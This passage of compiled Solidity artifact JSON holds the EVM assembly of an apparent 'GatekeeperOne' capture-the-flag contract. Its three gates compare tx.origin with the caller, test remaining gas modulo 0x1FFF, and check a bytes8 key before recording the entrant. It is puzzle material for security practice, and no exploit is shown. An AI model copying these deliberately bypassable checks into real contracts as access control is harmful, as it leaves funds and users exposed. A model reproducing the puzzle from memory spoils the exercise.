										},
										{
											"begin": 175,
											"end": 197,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "RETURN",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1224,
											"end": 1228,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 283,
											"end": 292,
											"name": "ORIGIN",
											"source": 1
										},
										{
											"begin": 269,
											"end": 292,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 269,
											"end": 292,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 269,
											"end": 279,
											"name": "CALLER",
											"source": 1
										},
										{
											"begin": 269,
											"end": 292,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 269,
											"end": 292,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 269,
											"end": 292,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 269,
											"end": 292,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 261,
											"end": 293,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 261,
											"end": 293,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 261,
											"end": 293,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 261,
											"end": 293,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 261,
											"end": 293,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 261,
											"end": 293,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 261,
											"end": 293,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 483,
											"end": 484,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 460,
											"end": 479,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 474,
											"end": 478,
											"name": "PUSH",
											"source": 1,
											"value": "1FFF"
										},
										{
											"begin": 460,
											"end": 469,
											"name": "GAS",
											"source": 1
										},
										{
											"begin": 460,
											"end": 473,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 460,
											"end": 473,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 460,
											"end": 479,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 460,
											"end": 479,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 460,
											"end": 479,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 460,
											"end": 479,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 460,
											"end": 479,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 460,
											"end": 479,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 460,
											"end": 479,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 460,
											"end": 484,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 452,
											"end": 485,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 452,
											"end": 485,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 452,
											"end": 485,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 452,
											"end": 485,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 452,
											"end": 485,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 452,
											"end": 485,
											"name": "tag",
											"source": 1,
											"value": "15"
										},
										{
											"begin": 452,
											"end": 485,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 681,
											"end": 689,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 674,
											"end": 690,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 674,
											"end": 690,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 639,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "FFFF"
										},
										{
											"begin": 639,
											"end": 691,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 653,
											"end": 661,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 646,
											"end": 662,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 646,
											"end": 662,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 639,
											"end": 691,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 639,
											"end": 691,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 639,
											"end": 691,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH data",
											"source": 1,
											"value": "29B1771185C3518A576BD8F9C5BD6F23BE4870A353B1401C23E337F30A5D0CB8"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "CODECOPY",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 631,
											"end": 737,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 631,
											"end": 737,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 882,
											"end": 890,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 875,
											"end": 891,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 875,
											"end": 891,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 847,
											"end": 891,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 847,
											"end": 891,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 861,
											"end": 869,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 854,
											"end": 870,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 854,
											"end": 870,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 847,
											"end": 891,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 847,
											"end": 891,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 847,
											"end": 891,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 847,
											"end": 891,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH data",
											"source": 1,
											"value": "39FE204B27A3E3ED4D75F8D47C15461CCE98ADFA1823A4A7FD67C936EB0C84DA"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "29"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "CODECOPY",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 839,
											"end": 937,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 839,
											"end": 937,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1066,
											"end": 1075,
											"name": "ORIGIN",
											"source": 1
										},
										{
											"begin": 1031,
											"end": 1076,
											"name": "PUSH",
											"source": 1,
											"value": "FFFF"
										},
										{
											"begin": 1031,
											"end": 1076,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1045,
											"end": 1053,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1038,
											"end": 1054,
											"name": "PUSH",
											"source": 1,
											"value": "C0"
										},
										{
											"begin": 1038,
											"end": 1054,
											"name": "SHR",
											"source": 1
										},
										{
											"begin": 1031,
											"end": 1076,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFF"
										},
										{
											"begin": 1031,
											"end": 1076,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1031,
											"end": 1076,
											"name": "EQ",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "2B"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH data",
											"source": 1,
											"value": "BFA38229EA3879F03173764F8F4BD3E16AA5BBDFAC4ABA032E756684DAB5EB09"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "2B"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "CODECOPY",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1023,
											"end": 1124,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1246,
											"end": 1255,
											"name": "ORIGIN",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1243,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1236,
											"end": 1243,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "MUL",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "NOT",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "MUL",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "OR",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "SSTORE",
											"source": 1
										},
										{
											"begin": 1236,
											"end": 1255,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1268,
											"end": 1272,
											"name": "PUSH",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 1261,
											"end": 1272,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1261,
											"end": 1272,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 491,
											"end": 492,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1140,
											"end": 1277,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SLOAD",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "100"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "EXP",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DIV",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 175,
											"end": 197,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 175,
											"end": 197,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4878,
											"end": 4885,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4909,
											"end": 4910,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4905,
											"end": 4906,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4905,
											"end": 4910,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "536166654D6174683A206D6F64756C6F206279207A65726F0000000000000000"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 4897,
											"end": 4939,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4960,
											"end": 4961,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4957,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "INVALID",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 4956,
											"end": 4961,
											"name": "MOD",
											"source": 0
										},
										{
											"begin": 4949,
											"end": 4961,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 4949,
											"end": 4961,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 4820,
											"end": 4968,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									],
									".data": {
										"29B1771185C3518A576BD8F9C5BD6F23BE4870A353B1401C23E337F30A5D0CB8": "476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274206f6e65",
										"39FE204B27A3E3ED4D75F8D47C15461CCE98ADFA1823A4A7FD67C936EB0C84DA": "476174656b65657065724f6e653a20696e76616c69642067617465546872656520706172742074776f",
										"BFA38229EA3879F03173764F8F4BD3E16AA5BBDFAC4ABA032E756684DAB5EB09": "476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274207468726565"
									}
								}
							}
						},
						"methodIdentifiers": {
							"enter(bytes8)": "3370204e",
							"entrant()": "9db31d77"
						}
					},
